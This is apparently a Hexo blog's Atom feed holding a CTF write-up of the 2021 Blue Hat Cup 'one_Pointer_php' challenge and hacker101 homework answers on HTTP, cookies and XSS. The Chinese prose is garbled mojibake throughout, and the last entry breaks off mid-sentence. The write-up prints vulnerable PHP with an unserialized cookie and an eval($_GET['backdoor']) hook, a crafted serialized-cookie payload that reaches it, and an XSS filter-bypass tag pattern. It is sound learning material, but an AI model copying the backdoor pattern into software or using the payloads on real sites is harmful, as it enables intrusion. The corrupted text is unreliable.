ç”¨åŠŸï¼ŒèŠ±äº†å¥½å‡ å¤©ï¼Œä½†ä¹Ÿå¾ˆå¢é•¿çŸ¥è¯†ã€‚</p><p>å¦‚æœå“ªé‡Œæˆ‘ç†è§£çš„ä¸å¯¹å¸Œæœ›èƒ½å‘Šè¯‰æˆ‘ï¼</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;æ´¥é—¨æ¯GoOSS&quot;&gt;&lt;a href=&quot;#æ´¥é—¨æ¯GoOSS&quot; class=&quot;headerlink&quot; title=&quot;æ´¥é—¨æ¯GoOSS&quot;&gt;&lt;/a&gt;æ´¥é—¨æ¯GoOSS&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;å¼„æ‡‚è¿™é“é¢˜èŠ±äº†æˆ‘å¾ˆé•¿æ—¶é—´ï¼ŒæœŸé—´èµ°äº†å¾ˆå¤šå¼¯è·¯â€¦â€¦ï¼ˆ&lt;strong&gt;w</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>è“å¸½æ¯2021å¤ç°</title>
    <link href="http://example.com/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-05-08T09:28:24.000Z</published>
    <updated>2021-05-13T09:01:10.038Z</updated>
    
    <content type="html"><![CDATA[<h3 id="è“å¸½æ¯2021å¤ç°"><a href="#è“å¸½æ¯2021å¤ç°" class="headerlink" title="è“å¸½æ¯2021å¤ç°"></a>è“å¸½æ¯2021å¤ç°</h3><h4 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h4><p>buuä¸Šå¼€äº†ç¯å¢ƒï¼ŒçœŸä¸é”™</p><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>add_api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$user=<span class="keyword">new</span> User;</span><br><span class="line">$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°±ä¸¤ä¸ªæ–‡ä»¶â€¦â€¦</p><p>å½“æ—¶çœ‹äº†åŠå¤©ï¼Œå°±åªçŸ¥é“è¦ç»•è¿‡<code>if($count[]=1)</code>â€¦â€¦å¯è¿™ç©æ„ä¸æ˜¯æ’å¯¹çš„å—â€¦â€¦</p><p>è¿™å…³ç³»åˆ°phpçš„ç´¢å¼•æ•°ç»„æº¢å‡º</p><h5 id="PHPæ•°ç»„"><a href="#PHPæ•°ç»„" class="headerlink" title="PHPæ•°ç»„"></a>PHPæ•°ç»„</h5><p><a href="https://blog.csdn.net/weixin_43821278/article/details/114763459">https://blog.csdn.net/weixin_43821278/article/details/114763459</a></p><p>æ ¹æ®è¿™ç¯‡æ–‡ç« çš„å®éªŒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php 5.59nts</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a[<span class="number">2147483647</span>]=<span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">$a[]=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><p><img src="D:\HexoBlog\source\images\è“å¸½æ¯2021å¤ç°\image-20210508181911478.png" alt="image-20210508181911478"></p><blockquote><p>$a[]è®¿é—®åˆ°çš„æ˜¯å½“å‰æœ€å¤§æ•°å€¼ç´¢å¼•çš„ä¸‹ä¸€ä½</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨5.5.9ntsç‰ˆæœ¬ä¸‹ï¼Œ2147483647å°±æ˜¯æ•°å€¼ç´¢å¼•çš„ç•Œé™ï¼Œè€Œ2147483647æ­£æ˜¯5.5.9ç‰ˆæœ¬ä¸­é»˜è®¤è®¾ç½®çš„æ•´å‹æœ€å¤§å€¼ï¼š<code>PHP_INT_MAX:int(2147483647)</code>ã€‚</p><p>è¿™é‡Œçš„intï¼Œæ˜¯<strong>æœ‰ç¬¦å·32ä½äºŒè¿›åˆ¶å¯è¡¨ç¤ºçš„æœ€å¤§æ•°</strong>ã€‚</p><blockquote><p><strong>2^31-1</strong>=<strong>2147483647</strong></p></blockquote><p>å¦‚æœè¶…è¿‡äº†å‘¢ï¼Ÿ</p><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165829865.png" alt="image-20210513165829865"></p><p>è¿™é‡Œä¼šè½¬åŒ–ä¸ºèŒƒå›´æ›´å¤§çš„floatå‚¨å­˜â€¦â€¦</p><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165839374.png" alt="image-20210513165839374"></p><p>æ•°ç»„ä¸­æº¢å‡ºåå°±ä¼šå›æ»šä»intçš„æœ€å°å€¼ï¼Œäºæ˜¯ä¼šç¬¦åˆè¿™æ ·çš„è§„å¾‹ï¼š</p><blockquote><p>0â€”2147483647                       ä¸‹æ ‡0~2147483647 </p><p>2147483648â€”4294967296   ä¸‹æ ‡-2147483648~0 </p><p>4294967296â€”6442450943   ä¸‹æ ‡ 0~2147483647</p><p>ä¸‹ä¸€ä¸ªæº¢å‡ºä¸º0çš„æ•°å­—æ˜¯ï¼š8589934592</p></blockquote><p>è¿™æ ·ä½¿ç”¨ä¼¼ä¹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœæ˜¯é€šè¿‡<code>$a[]</code>å»è·å–å°±ä¼šäº§ç”ŸæŠ¥é”™ï¼Œç›¸å…³ç‰ˆæœ¬çš„é¢˜ç›®æ˜¯<code>XCTF-favorite_number</code>ï¼Œå¯ä»¥ç ”ç©¶ç ”ç©¶ã€‚</p><h5 id="è¾ƒæ–°çš„ç‰ˆæœ¬"><a href="#è¾ƒæ–°çš„ç‰ˆæœ¬" class="headerlink" title="è¾ƒæ–°çš„ç‰ˆæœ¬"></a>è¾ƒæ–°çš„ç‰ˆæœ¬</h5><p>è¿™é‡Œæ˜¯7.3.4ntsçš„phpç‰ˆæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MAXï¼š&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MAX);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MINï¼š&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MIN);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_SIZEï¼š&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_SIZE);</span><br><span class="line"></span><br><span class="line">$a =<span class="number">9223372036854775806</span>;</span><br><span class="line">$b =<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_intï¼š&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_floatï¼š&quot;</span>;</span><br><span class="line">var_dump(is_float($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºï¼š</span><br><span class="line">PHP_INT_MAXï¼šint(9223372036854775807)</span><br><span class="line">PHP_INT_MINï¼šint(-9223372036854775808)</span><br><span class="line">PHP_INT_SIZEï¼šint(8)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">is_intï¼šbool(false)</span><br><span class="line">is_floatï¼šbool(true)</span><br><span class="line">9223372036854775806</span><br><span class="line">9223372036854775807</span><br><span class="line">9.2233720368548E+18</span><br></pre></td></tr></table></figure><p>åŒæ ·ä¼šè½¬åŒ–ä¸ºfloatè€Œä¸å†å±äºæ•´å‹ï¼Œå¹¶ä¼šä»¥ç§‘å­¦è®¡æ•°æ³•è¾“å‡º</p><p>è¿™é‡Œçš„â€œintâ€ï¼Œæ˜¯<strong>æœ‰ç¬¦å·64ä½äºŒè¿›åˆ¶å¯è¡¨ç¤ºçš„æœ€å¤§æ•°</strong>ï¼Œæˆ–è€…è¯´ï¼Œæˆ‘ä»¬æ›´åŠ ç†Ÿæ‚‰çš„<strong>long long int</strong>ã€‚</p><blockquote><p><strong>2^63-1</strong>=<strong>9223372036854775807</strong></p></blockquote><p>è¾ƒæ–°çš„ç‰ˆæœ¬å¤§æ¦‚æ˜¯æé«˜äº†ç´¢å¼•æº¢å‡ºçš„é˜ˆå€¼â€¦â€¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a[<span class="number">9223372036854775806</span>]=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165907924.png" alt="image-20210513165907924"></p><p>æœ€åçš„è¯­å¥æˆåŠŸæŠ¥é”™ï¼Œæ ¹æ®è¿™ä¸ªæ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$user=<span class="keyword">new</span> User;</span><br><span class="line">$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a =<span class="keyword">new</span> User();</span><br><span class="line">$a -&gt;count=<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line">$a =urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥æˆåŠŸç»•è¿‡èµ‹å€¼åˆ¤æ–­</p><blockquote><p>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</p></blockquote><p>æ‰§è¡Œå‘½ä»¤ï¼Œæ¥phpinfoçœ‹çœ‹æ•æ„Ÿä¿¡æ¯ï¼š</p><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165922744.png" alt="image-20210513165922744"></p><p>â€¦â€¦ä¸Šä¸€ä¸ªç»•è¿‡<strong>disable_function</strong>çš„è¿˜æ˜¯soåŠ«æŒæˆ–è€…èšå‰‘æ’ä»¶â€¦â€¦ä¸æ˜¯å¾ˆä¼šâ€¦â€¦</p><p>çœ‹äº†dalaoçš„wpï¼Œä¸€ç›´æä¸å¥½â€¦â€¦åŸç†å€’æ˜¯çœ‹äº†ä¸ƒä¸ƒå…«å…«â€¦â€¦</p><p>ç„¶åâ€¦â€¦æ²¡æœ‰ç„¶åäº†â€¦â€¦è¹²ä¸€ä¸ªå¥½å¤§ä½¬çš„wpğŸ˜¢</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;è“å¸½æ¯2021å¤ç°&quot;&gt;&lt;a href=&quot;#è“å¸½æ¯2021å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;è“å¸½æ¯2021å¤ç°&quot;&gt;&lt;/a&gt;è“å¸½æ¯2021å¤ç°&lt;/h3&gt;&lt;h4 id=&quot;one-Pointer-php&quot;&gt;&lt;a href=&quot;#one-Pointe</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>hacker101-2</title>
    <link href="http://example.com/2021/05/06/hacker101-2/"/>
    <id>http://example.com/2021/05/06/hacker101-2/</id>
    <published>2021-05-06T05:39:30.000Z</published>
    <updated>2021-05-06T05:39:50.905Z</updated>
    
    <content type="html"><![CDATA[<h5 id="hacker101-2"><a href="#hacker101-2" class="headerlink" title="hacker101.2"></a>hacker101.2</h5><p>ä¸­æ–‡è§†é¢‘ï¼š</p><p><a href="https://www.bilibili.com/video/BV1MJ411D75M?from=search&seid=11355973279630099592">ã€FreeBufå­—å¹•ç»„ã€‘Hacker101ç™½å¸½é»‘å®¢è¿›é˜¶ä¹‹è·¯-Webå·¥ä½œæœºåˆ¶</a></p><p>1.httpæŠ¥æ–‡çš„ç»“æ„æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆ1åˆ†ï¼‰ </p><blockquote><p>ä¸€ä¸ªHTTPè¯·æ±‚æŠ¥æ–‡ç”±è¯·æ±‚è¡Œï¼ˆrequest lineï¼‰ã€è¯·æ±‚å¤´éƒ¨ï¼ˆrequest headerï¼‰ã€ç©ºè¡Œå’Œè¯·æ±‚æ•°æ®4ä¸ªéƒ¨åˆ†æ„æˆã€‚</p><p><strong>è¯·æ±‚è¡Œ</strong>æ•°æ®æ ¼å¼ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼šè¯·æ±‚æ–¹æ³•ã€URIã€HTTPåè®®ç‰ˆæœ¬ï¼Œä»–ä»¬ä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚                                                     </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1 #è¯·æ±‚æ–¹æ³•ä¸ºGETï¼Œè¯·æ±‚è·¯å¾„ä¸ºæ ¹ç›®å½•ï¼Œ1.1ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p><strong>è¯·æ±‚å¤´éƒ¨</strong>ç´§è·Ÿç€è¯·æ±‚è¡Œï¼Œè¯¥éƒ¨åˆ†ä¸»è¦æ˜¯ç”¨äºæè¿°è¯·æ±‚æ­£æ–‡                                                                           </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Host: hackerone.com                                                       Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.121 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close##ä¸»è¦æ˜¯ç”¨äºè¯´æ˜è¯·æ±‚æºã€è¿æ¥ç±»å‹ã€Cookieä¿¡æ¯ã€å¯å¤„ç†å†…å®¹ç­‰</span><br></pre></td></tr></table></figure><p><strong>è¯·æ±‚æ­£æ–‡</strong>å’Œè¯·æ±‚å¤´éƒ¨é€šè¿‡ä¸€ä¸ªç©ºè¡Œè¿›è¡Œéš”å¼€ï¼Œä¸€èˆ¬ç”¨äºå­˜æ”¾POSTè¯·æ±‚ç±»å‹çš„è¯·æ±‚æ­£æ–‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin</span><br></pre></td></tr></table></figure></blockquote><p>2.ä»€ä¹ˆæ˜¯crlfï¼Ÿåœ¨httpæŠ¥æ–‡çš„å“ªä¸ªä½ç½®ã€‚ï¼ˆ1åˆ†ï¼‰ </p><blockquote><table><thead><tr><th><strong>ç¼©å†™</strong></th><th><strong>ASCâ…¡è½¬ä¹‰</strong></th><th><strong>ç³»ç»Ÿ</strong></th><th><strong>ASCâ…¡å€¼</strong></th></tr></thead><tbody><tr><td>CR</td><td>\r</td><td>MacIntoshï¼ˆæ—©æœŸçš„Macï¼‰</td><td>13</td></tr><tr><td>LF</td><td>\n</td><td>Unix/Linux/Mac OS X</td><td>10</td></tr><tr><td>CR LF</td><td>\r\n</td><td>Windows</td><td></td></tr></tbody></table><p>CRï¼šCarriage Returnï¼Œå¯¹åº”ASCIIä¸­è½¬ä¹‰å­—ç¬¦\rï¼Œè¡¨ç¤ºå›è½¦</p><p>LFï¼šLinefeedï¼Œå¯¹åº”ASCIIä¸­è½¬ä¹‰å­—ç¬¦\nï¼Œè¡¨ç¤ºæ¢è¡Œ</p><p>CRLFï¼šCarriage Return &amp; Linefeedï¼Œ\r\nï¼Œè¡¨ç¤ºå›è½¦å¹¶æ¢è¡Œ</p><p>Windowsæ“ä½œç³»ç»Ÿé‡‡ç”¨ä¸¤ä¸ªå­—ç¬¦æ¥è¿›è¡Œæ¢è¡Œï¼Œå³CRLFï¼›</p><p>Unix/Linux/Mac OS Xæ“ä½œç³»ç»Ÿé‡‡ç”¨å•ä¸ªå­—ç¬¦LFæ¥è¿›è¡Œæ¢è¡Œï¼›</p><p>MacIntoshæ“ä½œç³»ç»Ÿï¼ˆå³æ—©æœŸçš„Macæ“ä½œç³»ç»Ÿï¼‰é‡‡ç”¨å•ä¸ªå­—ç¬¦CRæ¥è¿›è¡Œæ¢è¡Œã€‚</p><hr><p><strong>Burp</strong>ä¸­ï¼Œç‚¹å‡»\nå³å¯çœ‹åˆ°æŠ¥æ–‡ä¸­crlfçš„è¯¦ç»†ä½ç½®ï¼Œæ®æˆ‘ç›®å‰çš„ç»éªŒï¼Œcrlfå¯ç”¨äºcsrfå’Œhttpèµ°ç§</p><p>â€¦â€¦</p></blockquote><p>3.è§£é‡Šä¸‹è¿™å‡ ä¸ªå¤´çš„å«ä¹‰ï¼ˆ5åˆ†ï¼‰ï¼š </p><img src="/images/week4/image-20210506102725317.png" alt="image-20210506102725317" style="zoom:80%;" /><blockquote><p>headå¤´ï¼š</p><p>Hostï¼šè¡¨æ˜è¯·æ±‚å°†è¦å‘é€è‡³çš„å®é™…ä¸»æœº</p><p>Acceptï¼šå®¢æˆ·ç«¯æµè§ˆå™¨å¯å¤„ç†çš„MIMEç±»å‹ï¼Œè®¾ç½®ç”¨æ¥æŒ‡å®šå“åº”ç±»å‹</p><p>Cookieï¼šåŒ…å«å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ä¼ é€’çš„cookieæ•°æ®</p><p>Refererï¼šè¡¨æ˜è¯·æ±‚å…·ä½“æ¥æºäºå“ªä¸ªé¡µé¢çš„é“¾æ¥</p><p>Authorizationï¼šé€šå¸¸ç”¨æ¥åšä¸€äº›tokenè®¤è¯</p></blockquote><p>4.cookieå…·æœ‰å“ªäº›ç‰¹ç‚¹ï¼Œä¸åŒçš„åŸŸåå’Œå­åŸŸåå¯¹cookieæœ‰æ€æ ·çš„æƒé™ï¼ŸCookieçš„Secureå’Œ HTTPOnlyè¿™ä¸¤ä¸ªflagåˆ†åˆ«æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿè¯·ç»“åˆxssæ”»å‡»æ¥è¿›è¡Œè¯´æ˜ï¼ˆ3åˆ†ï¼‰ </p><blockquote><p>è‹¥Set-CookieæŒ‡å®šDomainä¸ºxxx.comï¼Œé‚£ä¹ˆxxx.comçš„å­åŸŸååŒæ ·èƒ½å¤Ÿè®¿é—®è·å–åˆ°è¿™ä¸ªCookieã€‚è‹¥æŒ‡å®šDomainä¸ºæŸå­åŸŸå(sub.xxx.com)ï¼Œé‚£ä¹ˆåªæœ‰è¯¥å­åŸŸååŠå…¶ä¸‹çº§å­åŸŸåæ‰å¯ä»¥è®¿é—®è·å¾—Cookieã€‚</p><p>Cookieçš„Secureå±æ€§ï¼šè¿™ä»£è¡¨Cookieåªèƒ½åœ¨HTTPSåè®®ä¸­ä¼ è¾“</p><p>Cookieçš„HTTPOnlyå±æ€§ï¼šç¡®ä¿cookieåªèƒ½é€šè¿‡Webè¯·æ±‚ä¼ è¾“ï¼Œè€Œä¸èƒ½ç”¨JavaScriptæ¥è¯»å–è®¿é—®ã€‚åŸæœ¬å¯ç”¨çš„document.cookieæ–¹æ³•çš„JSè„šæœ¬åœ¨æ‰“å¼€HTTPOnlyåæ— æ³•è¯»å–cookieï¼Œcookieåªåœ¨è¯·æ±‚ä¸­ä¼ è¾“ã€‚</p></blockquote><p>5.ç®€è¿°æœ¬è§†é¢‘æåˆ°çš„xssç»•è¿‡webé˜²ç«å¢™çš„æ–¹æ¡ˆï¼ˆ5åˆ†ï¼‰</p><blockquote><p>åˆ©ç”¨æµè§ˆå™¨ä¸WAFå¯¹htmlè§£ææ–¹å¼ä¸åŒçš„ç‰¹ç‚¹ã€‚&lt;script/xss src=xxxxxx&gt;åœ¨æµè§ˆå™¨ä¸­ï¼Œ/ä¼šè¢«è§£æä¸º%20ï¼Œè€ŒWAFä»…ä»…è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªscript/xssæ ·å¼ã€‚è¿™æ ·å°±ç»•è¿‡äº†WAFï¼Œè€Œæµè§ˆå™¨ä¸­è¯¥æ ‡ç­¾å¾—ä»¥æ‰§è¡Œã€‚</p></blockquote><p>6.å†…å®¹å—…æ¢æ˜¯ä»€ä¹ˆï¼Ÿä¸»è¦æœ‰å“ªäº›ç±»å‹ï¼Ÿè¯·åˆ†åˆ«ä¸¾ä¾‹ï¼Œä¸»è¦ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿåœ¨ä»€ä¹ˆæƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´ï¼Ÿä¸ºä»€ä¹ˆfacebookç­‰ç½‘ç«™éœ€è¦ä½¿ç”¨ä¸åŒçš„åŸŸåæ¥å­˜å‚¨å›¾ç‰‡ï¼Ÿï¼ˆ5åˆ†ï¼‰</p><blockquote><p><strong>å†…å®¹å—…æ¢ï¼ˆContent Sniffingï¼‰</strong></p><p>æµè§ˆå™¨åœ¨æ˜¾ç¤ºå“åº”å›æ¥çš„è¯·æ±‚æ–‡ä»¶æˆ–ç½‘é¡µæ—¶ï¼Œè‹¥ä¸çŸ¥é“è¯¥æ–‡ä»¶æˆ–ç½‘é¡µçš„å…·ä½“æ–‡ä»¶å†…å®¹ï¼ˆContent-Typeï¼‰ï¼Œä¼šå¯åŠ¨å†…å®¹å—…æ¢æœºåˆ¶ã€‚å¦‚ï¼š<strong>MIME Sniffing</strong>ï¼Œå®ƒçš„åŸç†æ˜¯æµè§ˆå™¨å›æ˜¾è‡ªåŠ¨æ¢æµ‹æœªçŸ¥æ ¼å¼çš„è¯·æ±‚æ–‡ä»¶ç±»å‹ã€‚å¦ï¼š<strong>Encoding Sniffing</strong>ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨æ£€æµ‹æœªçŸ¥æ ¼å¼æ–‡ä»¶çš„ç¼–ç ç±»å‹ã€‚é€šè¿‡å¯¹å†…å®¹ç¼–ç æ 